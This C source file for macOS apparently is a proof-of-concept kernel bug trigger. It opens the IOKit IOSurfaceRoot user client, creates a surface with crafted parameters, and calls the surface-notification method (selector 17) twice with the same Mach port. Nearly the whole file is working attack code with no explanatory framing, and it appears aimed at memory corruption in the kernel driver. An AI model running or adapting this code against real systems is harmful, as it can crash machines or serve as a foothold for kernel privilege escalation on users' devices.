

#include <stdio.h>

#include <mach/mach_error.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/mach_types.h>
#import <CoreFoundation/CoreFoundation.h>
#import <IOKit/IOKitLib.h>
#import <IOKit/IOTypes.h>

#include <stdlib.h>
#include <stdarg.h>

typedef enum{
    L_DEBUG,
    L_INFO,
    L_WARN,
    L_ERROR
}LEVEL, *PLEVEL;

#define MAX_LOG_MESSAGE 1024

bool LogMessage(LEVEL Level, const char* szFormat, ...)
{
    char szMessage[MAX_LOG_MESSAGE];
    va_list Args;

    va_start(Args, szFormat);
    vsprintf(szMessage, szFormat, Args);
    va_end(Args);

    switch(Level){
        case L_DEBUG:
            fprintf(stdout, "[?] %s\n", szMessage);
            break;
        case L_INFO:
            fprintf(stdout, "[+] %s\n", szMessage);
            break;
        case L_WARN:
            fprintf(stderr, "[*] %s\n", szMessage);
            break;
        case L_ERROR:
            fprintf(stderr, "[!] %s\n", szMessage);
            break;
    }

    fflush(stdout);
    fflush(stderr);
    return true;
}

bool GenerateServiceConnect(const char* name, int type, io_connect_t *pioConnect, kern_return_t *pkr = NULL)
{
    kern_return_t kr;
    CFMutableDictionaryRef matchDictionary = IOServiceMatching(name);
    if(matchDictionary != NULL){
        io_service_t ioService = IOServiceGetMatchingService(kIOMasterPortDefault, matchDictionary);
        if(ioService){
            io_connect_t ioConnect;
            kr = IOServiceOpen(ioService, mach_task_self(), type, &ioConnect);
            if(kr == KERN_SUCCESS){
                LogMessage(L_INFO, "generate service (%s) type:0x%x connect success connect:0x%x", name, type, ioConnect);
                if(pioConnect){
                    *pioConnect = ioConnect;
                }
                return true;
            }else{
                if(kr)
                    *pkr = kr;
            }
        }
    }
    LogMessage(L_INFO, "generate service (%s) type:0x%x connect failed err:(0x%x,%s)", 
        name, type, kr, mach_error_string(kr));
    return false;
}

typedef struct tagCREATESURFACE
{
	void* address;
	uint32_t width;
	uint32_t height;
	uint32_t pixelformat;
	uint32_t bytesPerElement;
	uint32_t bytesPerRow;
	uint32_t allocSize;
	
}CREATESURFACE, *PCREATESURFACE;

uint64_t GenSurface(io_connect_t *piocnn)
{
    io_connect_t conn;
    kern_return_t kr;
    uint64_t hRet = 0;
    bool bRet = GenerateServiceConnect("IOSurfaceRoot", 0, &conn);
    if(conn){
        
        //
        // create a surface 
        //

        uint64_t inputScalar[16];
        size_t inputScalarCnt = 0;


        CREATESURFACE param;
        void* pAddress = malloc(0x200);
        memset(&param, 0, sizeof(param));
        
        //
        // fill parameter
        //
        
        param.width = 0x11;
        param.height = 0x7;
        param.pixelformat = 1;
        param.bytesPerElement = 1;//CRandDWord::RenderW();
        param.bytesPerRow = 0x54;
        param.allocSize = 588;
        param.address = pAddress;

        uint64_t outputScalar[16];
        uint32_t outputScalarCnt = 0;

        char outputStruct[4096];
        size_t outputStructCnt = 0x3c8;
        
        //
        // call create surface
        //
        
        kr = IOConnectCallMethod(
                conn,
                6,
                NULL,
                0,
                &param,
                0x20,
                outputScalar,
                &outputScalarCnt,
                outputStruct,
                &outputStructCnt);
        if(kr == KERN_SUCCESS){
            LogMessage(L_INFO, "gen surface(w=0x%x, h=0x%x, bpr=0x%x) success ret 0x%x", 
                param.width, param.height, param.bytesPerRow, *(uint32_t*)((unsigned char*)outputStruct + 0x10));
            
            //
            // save connect
            //
            
            if(piocnn){
                *piocnn = conn;
            }
            hRet = (*(uint32_t*)((unsigned char*)outputStruct + 0x10));
        }else{
            LogMessage(L_INFO,"gen surface(w=0x%x, h=0x%x, bpr=0x%x) failed err(0x%x,%s)", 
            param.width, param.height, param.bytesPerRow, kr, mach_error_string(kr));
        }

        if(pAddress){
            free(pAddress);
        }

    }else{
        LogMessage(L_INFO,"SufaceRoot gen error(type=0) conn");
    }
    
    //
    // clean up
    //
    
    if(!hRet && conn){
        IOServiceClose(conn);
    }

    return hRet;
}

mach_port_t GenPortObj()
{
    mach_port_right_t right = 1;
    mach_port_qos_t qos;
    mach_port_t port = 0;
    kern_return_t nret;

    qos.name = 0; //kernel allocate a name.
    qos.prealloc = true;
    qos.len = 10;
    
    //nret = mach_port_allocate_full(mach_task_self(), right, MACH_PORT_NULL, &qos, &port);
    nret = mach_port_allocate(mach_task_self(), right, &port);
    if(KERN_SUCCESS == nret){
        LogMessage(L_INFO, "gen port(right=%d) port=0x%x", right, port);
    }else{
        LogMessage(L_ERROR, "gen port(right=%d) failed, err=%x", right, nret);
    }

    return port;
}

void s_set_surface_notify(mach_port_t port, uint64_t hsurface, io_connect_t conn)
{
    //callback
    //refcount
    //xxxx

    kern_return_t kr;
    uintptr_t hSurface;

    
    //
    // alloc buffer 
    //
    
    uint32_t Length = 0x18;
    unsigned char* pInStructBuff = (unsigned char*)malloc(Length);


    *(uint64_t*)(pInStructBuff) = 0x1234;
    *(uint64_t*)(pInStructBuff + 8) = (uint64_t)5;
    *(uint64_t*)(pInStructBuff + 0x10) = 0x5678;

    LogMessage(L_INFO, "s_set_surface_notify(0x%p)", hsurface);

    uint64_t reference = 0x2222;

    kr = IOConnectCallAsyncMethod(
            conn,
            17,
            port,
            &reference,
            1,
            NULL,
            0,
            pInStructBuff,
            Length,
            NULL,
            NULL,
            NULL,
            NULL);
    if(kr != KERN_SUCCESS){
        // do some record
        LogMessage(L_INFO,"s_set_surface_notify!!!!!!!fuck error!!! %s", mach_error_string(kr));
    }

    if(pInStructBuff){
        free(pInStructBuff);
    }
}


int main(int argc, char *argv[])
{
    mach_port_t port = GenPortObj();
    io_connect_t conn;
    uint64_t pSurface = GenSurface(&conn);

    if(!port || !pSurface || !conn){
        LogMessage(L_INFO, "gen error");
    }

    s_set_surface_notify(port, pSurface, conn);
    s_set_surface_notify(port, pSurface, conn);

}